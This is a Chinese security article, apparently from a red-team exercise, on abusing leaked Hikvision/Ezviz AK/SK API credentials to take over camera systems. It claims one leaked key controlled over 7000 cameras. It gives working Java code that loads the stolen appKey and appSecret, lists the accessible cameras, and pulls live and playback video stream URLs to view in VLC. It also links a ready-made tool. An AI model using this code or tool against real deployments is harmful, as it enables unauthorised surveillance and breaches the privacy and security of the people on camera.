<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/OeM3kQfBfRXcz-LKg27dAg)

原理分析
----

海康威视通过 AK、SK 进行身份验证，通过调用接口实现视频预览等功能。因此代码中泄露了 key 即可能造成摄像头集群被接管。

下面是某次攻防演习实战中遇到的 hikvison 凭证泄露。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XB8gUH3cR11uKO5olJViaPvkpa4nxqM4CB4xHXYFy81FJ7htGYwLcWRFMIOYgtmWnFvqiaicToWZ2BKh8b8ubGsyg/640?wx_fmt=png)

某次遇到萤石一个 aksk 可控 7000 + 摄像头。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XB8gUH3cR11uKO5olJViaPvkpa4nxqM4CzlLtsfp79Wn2dQibzv3cOotj3jYPnsPtzxVE8Z474KMticDTyoBwUtpQ/640?wx_fmt=png)

利用方式
----

### 海康威视

海康 API 对接 (JAVA)

> https://www.freesion.com/article/60261295938/

①下载官方 sdk

> https://open.hikvision.com/download/5c67f1e2f05948198c909700?type=10

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XB8gUH3cR11uKO5olJViaPvkpa4nxqM4Ctfict1WmhZhicLw0vHhljWdFh8oicakAW4ibqe8VTuShePamZLicA68QPtA/640?wx_fmt=png)

②IDEA 新建 maven 项目，并将 OpenAPI 认证库导入 maven

```
mvn install:install-file 
 -Dfile=/Users/niudai/lang/apache-maven-3.6.3/artemis-http-client-1.1.3.jar
 -DgroupId=artemis-http-client
 -DartifactId=hk
 -Dversion=1.1.3
 -Dpackaging=jar


```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XB8gUH3cR11uKO5olJViaPvkpa4nxqM4CRW5He6tibkZ7WA3Ky19zb2qEIWicPnD4opVNRDJVRO35PYXuQIfUBxFg/640?wx_fmt=png)

③创建项目代码

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XB8gUH3cR11uKO5olJViaPvkpa4nxqM4CLEbY8s3utOwVn17EoBtkUmJgicI4qlhNOqhSUibqaxdf55eL99uk0P8w/640?wx_fmt=png)

`pom.xml`增加 dependencies

```
        <dependency>
            <groupId>artemis-http-client</groupId>
            <artifactId>hk</artifactId>
            <version>1.1.3</version>
        </dependency>
        <dependency>
            <groupId>com.alibaba</groupId>
            <artifactId>fastjson</artifactId>
            <version>1.2.68</version>
        </dependency>
    </dependencies>

```

`DataTypeConversionUtil.java`

```
public class DataTypeConversionUtil {
    public static Map<String,Object> getStringToMap(String str){
        JSONObject parseObject = JSONArray.parseObject(str);
        return parseObject;
    }
}

```

`HKUtil.java`

```
import com.alibaba.fastjson.JSONObject;
import com.hikvision.artemis.sdk.ArtemisHttpUtil;
import com.hikvision.artemis.sdk.config.ArtemisConfig;

import java.util.HashMap;
import java.util.Map;

/**
 * 海康工具类
 */
public class HKUtil {
    static {
        // 代理API网关nginx服务器ip端口
        ArtemisConfig.host = "220.xxx.xxx.xxx";
        // 秘钥appkey
        ArtemisConfig.appKey = "xxxx";
        // 秘钥appSecret
        ArtemisConfig.appSecret = "uxxxxx";
    }
    /**
     * 能力开放平台的网站路径
     * TODO 路径不用修改，就是/artemis
     */
    private static final String ARTEMIS_PATH = "/artemis";
    /**
     * 通用海康接口
     * 调用POST请求类型(application/json)接口*
     * @return
     */
    public static Map<String,Object> publicHkInterface(JSONObject jsonBody,String url){
        final String getCamsApi = ARTEMIS_PATH +url;
        Map<String, String> path = new HashMap<String, String>(2);
        path.put("https://", getCamsApi);
        // post请求application/json类型参数
        String result =ArtemisHttpUtil.doPostStringArtemis(path,jsonBody.toJSONString(),null,null,"application/json",null);
        return  DataTypeConversionUtil.getStringToMap(result);
    }


    /**
     * 获取监控点预览取流URL
     * @param id 设备编号
     * @return
     */
    public static Map<String,Object> camerasPreviewURLs(String id){
        JSONObject jsonBody = new JSONObject();
//        jsonBody.put("cameraIndexCode", id);
//        jsonBody.put("protocol", "hls");、
//        jsonBody.put("streamType", 0);
//        jsonBody.put("protocol", "rtsp");
//        jsonBody.put("transmode", 1);
//        jsonBody.put("expand", "streamform=ps");
        Map<String,Object> returnMap=publicHkInterface(jsonBody,"/api/video/v1/cameras/previewURLs");
        return returnMap;
    }

    /**
     * API名称：
     * 查询监控点列表v2
     * 分组：
     * 视频资源接口
     * 提供方名称：
     * 资源目录服务
     * qps：
     * 描述：根据条件查询目录下有权限的监控点列表
     * @return
     */
    public static Map<String,Object> cameraSearch(){
        JSONObject jsonBody = new JSONObject();
        jsonBody.put("pageNo", 1);
        jsonBody.put("pageSize", 1000);
        jsonBody.put("resourceType", "door");
        Map<String,Object> returnMap=publicHkInterface(jsonBody,"/api/resource/v2/camera/search");
        return returnMap;
    }

    public static Map<String,Object> getCameraPlayBackURL(String id){
        JSONObject jsonBody = new JSONObject();
        jsonBody.put("cameraIndexCode", id);
//        jsonBody.put("protocol", "rtsp");
        jsonBody.put("beginTime", "2020-12-15T09:35:06.000+08:00");
        jsonBody.put("endTime", "2021-06-17T15:00:00.000+08:00");
        Map<String,Object> returnMap=publicHkInterface(jsonBody,"/api/video/v1/cameras/playbackURLs");
        return returnMap;
    }


    public static void main(String[] args) {
        System.out.println(cameraSearch());
//        System.out.println(camerasPreviewURLs("33068100001310938991"));
//        System.out.println(getCameraPlayBackURL("33068100001310938991"));
    }
}

```

先通过`cameraSearch()`即`/api/resource/v2/camera/search`接口，获取有权限的设备列表的信息。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XB8gUH3cR11uKO5olJViaPvkpa4nxqM4C8uwpmHvq24A6aeg4ME2TticVwsicm8o2ibHIdnZx6QBr9SMKuectfT00Q/640?wx_fmt=png)

比较重要的信息是`indexCode`和`regionPathName`，

获取视频流是调用`camerasPreviewURLs()`即`/api/video/v1/cameras/previewURLs`接口，需要传入`indexCode`，根据官方文档可以设置不同的取流协议（默认是 rtsp）。

返回的视频流地址使用 VLC 连接即可。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XB8gUH3cR11uKO5olJViaPvkpa4nxqM4CFUl9ibVd0Cx7R8iauRGoricZx0UzwiagTEodaHcIQ3hP4ibxJVjLvPdBvYg/640?wx_fmt=png)

**项目地址**

```
https://github.com/darkarmorlab/video-api-check

```

**工具地址**

```
https://github.com/darkarmorlab/video-api-check/releases/tag/v1.0

```

**实战案例**

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XB8gUH3cR11uKO5olJViaPvkpa4nxqM4Ct3CYGR2cOhVA1ziaYqzEz5Aj4E9RHe4Q1063fNB8iaGYOiaJt3S8s9DibA/640?wx_fmt=png)

泄漏海康威视凭证

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XB8gUH3cR11uKO5olJViaPvkpa4nxqM4CgXwe74s2a1BqRf78R9VWEicw9A1qd81hw1vEpDSRlkBJicAhcjAttQKA/640?wx_fmt=png)

**![](https://mmbiz.qpic.cn/sz_mmbiz_png/XB8gUH3cR11uKO5olJViaPvkpa4nxqM4CFUl9ibVd0Cx7R8iauRGoricZx0UzwiagTEodaHcIQ3hP4ibxJVjLvPdBvYg/640?wx_fmt=png)**